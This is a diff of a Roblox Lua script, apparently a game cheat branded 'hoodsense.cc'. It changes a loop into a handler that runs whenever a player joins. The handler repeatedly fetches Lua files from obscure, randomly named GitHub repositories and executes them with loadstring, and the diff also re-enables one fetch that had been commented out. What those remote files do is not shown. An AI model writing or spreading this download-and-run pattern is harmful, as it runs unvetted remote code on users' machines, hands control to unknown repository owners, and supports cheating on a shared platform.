@@ -1635,20 +1635,24 @@ print("| [hoodsense.cc] Website - https://hoodsense.cf         |")
 print("_________________________________________________________")
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
-while true do
+warn("[hoodsense.cc] Emojis reloaded!")
+
+local Players = game:GetService("Players")
+
+Players.PlayerAdded:Connect(function(player)
+    print(game.JobId, "[hoodsense.cc] Succesfully Reloaded!")
     loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/dp.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/dp2.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p1.lua'))()
-    --loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p2.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p2.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p3.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p4.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p5.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p6.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p7.lua'))()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/saopidjaopsdjp2wa/uyoibxcvrwqedhfg/main/p8.lua'))()
-    wait(1)
-    end
+end)
 
 -------------------------------------------------------------------------
 --[[
